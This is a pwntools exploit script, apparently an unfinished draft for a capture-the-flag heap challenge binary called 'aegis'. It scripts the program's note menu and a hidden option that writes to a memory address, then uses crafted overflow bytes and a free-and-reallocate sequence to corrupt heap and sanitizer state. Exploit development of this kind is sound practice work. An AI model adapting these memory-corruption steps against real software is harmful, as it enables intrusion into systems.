#!/usr/bin/python
from pwn import *
context.binary = "./aegis"
context.arch = "amd64"
context.os = "linux"
context.terminal  = ["tmux", "sp", "-h"]
p = gdb.debug("./aegis", gdbscript='b *0x5555556686d6\n')

def add_note(size, content, ID):
    p.sendline("1")
    print(p.recv())
    p.sendline("{}".format(size))
    print(p.recv())
    p.send("{}".format(content))
    print(p.recv())
    p.sendline("{}".format(ID))
    print(p.recv())

def show_note(index):
    p.sendline("2")
    print(p.recv())
    p.send("{}".format(index))
    print(p.recv())

def update_note(index, new_content, new_ID):
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.send("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))
    print(p.recv())

def delete_note(index):
    p.sendline("4")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())

def secret(addr):
    p.sendline("666")
    print(p.recv())
    p.sendline("{}".format(addr))
    print(p.recv())

def exit():
    p.sendline("5")
    print(p.recv())

print(p.recv())
BASE = 0x555555554000
VAL = 0xffff02ffffffffff
NEG = 0xffffffffffffffff
add_note(16, "a"*8, NEG)
secret(0x0c047fff8004)
update_note(0, "a"*16 + "\x02" + "\n", VAL)
#add_note(16, "b"*8, NEG)
#add_note(16, "c"*8, NEG)
delete_note(0)
add_note(16, "d"*8 + "\n", NEG)

p.interactive()
